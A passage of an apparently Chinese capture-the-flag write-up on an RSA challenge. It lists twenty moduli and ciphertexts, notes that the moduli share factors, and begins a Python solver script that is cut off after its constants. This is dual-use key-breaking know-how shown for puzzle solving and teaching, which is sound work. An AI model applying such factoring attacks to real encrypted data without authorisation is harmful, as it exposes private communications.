22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class="line">c = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><span class="line"></span><br><span class="line">n = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class="line">c = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><span class="line"></span><br><span class="line">n = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class="line">c = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><span class="line"></span><br><span class="line">n = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class="line">c = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><span class="line"></span><br><span class="line">n = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class="line">c = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><span class="line"></span><br><span class="line">n = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class="line">c = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><span class="line"></span><br><span class="line">n = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class="line">c = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><span class="line"></span><br><span class="line">n = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class="line">c = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><span class="line"></span><br><span class="line">n = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class="line">c = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><span class="line"></span><br><span class="line">n = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class="line">c = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><span class="line"></span><br><span class="line">n = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class="line">c = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><span class="line"></span><br><span class="line">n = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class="line">c = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><span class="line"></span><br><span class="line">n = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span><br><span class="line">c = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span><br></pre></td></tr></table></figure><p>原本以為是共模攻擊，仔細看了一下發現是模不互素，</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c2 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c3 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c4 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c5 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c6 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c7 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c8 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c9 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c10 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c11 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c12 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c13 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c14 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c15 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c16 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c17 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c18 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c19 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n20 = <span 